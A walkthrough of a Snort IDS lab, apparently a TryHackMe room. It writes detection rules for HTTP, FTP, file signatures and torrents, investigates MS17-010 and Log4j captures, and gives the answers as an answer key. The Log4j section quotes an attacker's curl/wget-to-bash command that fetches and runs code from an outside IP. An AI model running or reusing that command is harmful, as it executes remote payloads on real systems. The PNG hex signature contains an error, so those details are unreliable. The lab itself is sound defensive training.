# Snort Challenge - The Basics

### Writing IDS Rules (HTTP)
- Write a single rule to detect "all TCP port 80 traffic" packets in the given pcap file. What is the number of detected packets? <br />
Move to the TASK-2 folder. To write new rules, we need to edit `local.rules`. The rule we need is: <br />

      alert tcp any any -> any 80 (msg:"TCP traffic on port 80 detected"; sid:1000001; rev:1;)
   
To run snort and test this rules on the .pcap file, run the following command: `snort -c local.rules -A full -l . -r mx-3.pcap -K ASCII` <br />
![image](https://github.com/user-attachments/assets/46ab7687-65c9-4517-ba91-680c54b28237) <br />
The number of detected HTTP packets is `164`. <br /><br />

- Investigate the log file. What is the destination address of packet 63? <br />
Run the command `sudo snort -r snort.log.1724491962 -n 63` to get the answer: `216.239.59.99`<br />
- What is the ACK number of packet 64? <br />
Run the command `sudo snort -r snort.log.1724491962 -n 64` to get the answer: `0x2E6B5384` <br />
- What is the SEQ number of packet 62? <br />
Run the command `sudo snort -r snort.log.1724491962 -n 62` <br />
![image](https://github.com/user-attachments/assets/d5a10956-4f0d-4d8f-8184-27f39e087e57)<br />
`0x36C21E28`. <br />
- What is the TTL of packet 65? `128` <br />
- What is the source IP of packet 65? `145.254.160.237` <br />
- What is the source port of packet 65? `3372` <br />


### Writing IDS Rules (FTP)
Write a single rule to detect "all TCP port 21"  traffic in the given pcap.  <br />
Similarly as before, the rule we need to add is: <br />

      alert tcp any any <> any 21 (msg:"TCP traffic on port 21 detected"; sid:1000001; rev:1;)
This will capture every packet (in every direction) having destination port 21. <br />
- What is the number of detected packets? <br />
After running `snort -c local.rules -A full -l . -r ftp-png-gif.pcap`, the number of detected packets by snort are `307`. <br />

- Investigate the log file. What is the FTP service name? <br />
My guess is that the name of the FTP service is probably inside the banner, therefore it should be inside the very first packets. Try to inspect only the first 5 packets and see what happens. To read the content of the packet we can use the `-X` flag. <br />
Therefore run the command `snort -r snort.log.1724497351 -X -n 5`. The 4th packet has the answer we are looking for:
![image](https://github.com/user-attachments/assets/85dbbbe3-791c-4e43-8129-fd833f7a7018) <br />
`Microsoft FTP Service`. <br />

- Write a rule to detect failed FTP login attempts in the given pcap. What is the number of detected packets? <br />
By looking at the contents of the packet, notice that each failed FTP login attempt prompts a default message with the pattern "530 User". We want to filter every packet with this pattern; to do that we can use the `content` parameter. The rule is:

      alert tcp any any <> any 21 (msg:"Failed login detected"; content:"530 User"; sid:1000001; rev:1;)
And again run the command `snort -c local.rules -A full -l . -r ftp-png-gif.pcap`. <br />
![image](https://github.com/user-attachments/assets/2840e4f9-4988-4c86-bef6-bab1824f2629)<br />
The number of detected failed login attempts is `41`. <br />

- Write a rule to detect successful FTP logins in the given pcap. The process is similar as before, but filter for the pattern "230 User" instead. The answer is `1`. <br />
- Write a rule to detect FTP login attempts with a valid username but no password entered yet. Now filter for "331 Password" to get the answer: `42`. <br />
- Write a rule to detect FTP login attempts with the "Administrator" username but no password entered yet. <br />
For this we're going to need identify two different patterns on the same packets. The first pattern is "331 Password" and the second is "Administrator". Therefore the final rule is:

      alert tcp any any <> any 21 (msg:"Failed login detected"; content:"Administrator"; content:"331 Password"; sid:1000001; rev:1;)

The number of such login attempts detected by snort is `7`. <br />

### Writing IDS Rules (PNG)

- Write a rule to detect the PNG file in the given pcap. Investigate the logs and identify the software name embedded in the packet. <br />
To find the png file we first need to search it's [hexadecimal signature](https://en.wikipedia.org/wiki/List_of_file_signatures) to be able to identify it. The final rule should look something like this:

      alert tcp any any <> any any (msg:"PNG file Detected"; content:"|89 50 4A 47 0D 0A 1A 0A|"; sid:100002; rev:1;)
Now run `snort -r snort.log.1724508168 -d` to find the content of the packet: 
![image](https://github.com/user-attachments/assets/45d22586-5822-4b11-b915-d2bf7b629042)<br />
The software is `Adobe ImageReady`<br />

- Write a rule to detect the GIF file in the given pcap. Investigate the logs and identify the image format embedded in the packet.
The process is similar as before but now we need to look for the hexadecimal signature of GIF, which is `47 49 46 38 39`.
![image](https://github.com/user-attachments/assets/287b054d-f273-452c-adb8-7e960219ca7f) <br />
The format is `GIF89a`. <br />

### Writing IDS Rules (Torrent Metafile)

- Write a rule to detect the torrent metafile in the given pcap. <br />
The rule to add here is very intuitive:

      alert tcp any any <> any any (msg:"PNG file Detected"; content:"torrent"; sid:100002; rev:1;)
Snort detecs 2 packets using this rule. The answer to the following questions can be easily found in the content of the packets. <br />
- What is the number of detected packets? `2`. <br />

- What is the name of the torrent application? `bittorrent` <br />
- What is the MIME (Multipurpose Internet Mail Extensions) type of the torrent metafile? `application/x-bittorrent` br />
- What is the hostname of the torrent metafile? `tracker2.torrentbox.com` <br />

### Troubleshooting Rule Syntax Errors
In this section we need to fix the syntax error in local-X.rules files and make them work smoothly. Each answer will correspond to the number of detected packets using the newly corrected rule. Let's start: <br />
1) `16` <br />
2) `68` <br />
3) `87` <br />
4) `90` <br />
5) `155` <br />
6) `2` <br />
7) `msg` <br />

### Using External Rules (MS17-010)
Moving on to TASK-7: <br />
- Use the given rule file (local.rules) to investigate the ms1710 exploitation. What is the number of detected packets? `25154` <br />
- Use local-1.rules empty file to write a new rule to detect payloads containing the "\IPC$" keyword. What is the number of detected packets? `12`<br />
- What is the requested path? `\\192.168.116.138\IPC$` <br />
- What is the CVSS v2 score of the MS17-010 vulnerability? After some quick OSINT, the answer can be easily found: `9.3` <br />

### Using External Rules (Log4j)
By now we should be able to complete each task without explicitly explaining every step: 
- Use the given rule file (local.rules) to investigate the log4j exploitation. What is the number of detected packets? `26` <br />
- How many rules were triggered? `4`<br />
- What are the first six digits of the triggered rule sids? `210037`<br />
- What is the number of detected packets? `41`<br />
- What is the name of the used encoding algorithm? `Base64`<br />
- What is the IP ID of the corresponding packet? `62808`<br />
- What is the attacker's command? `(curl -s 45.155.205.233:5874/162.0.228.253:80||wget -q -O- 45.155.205.233:5874/162.0.228.253:80)|bash`<br />
- What is the CVSS v2 score of the Log4j vulnerability? `9.3`<br /><br />

bye :)
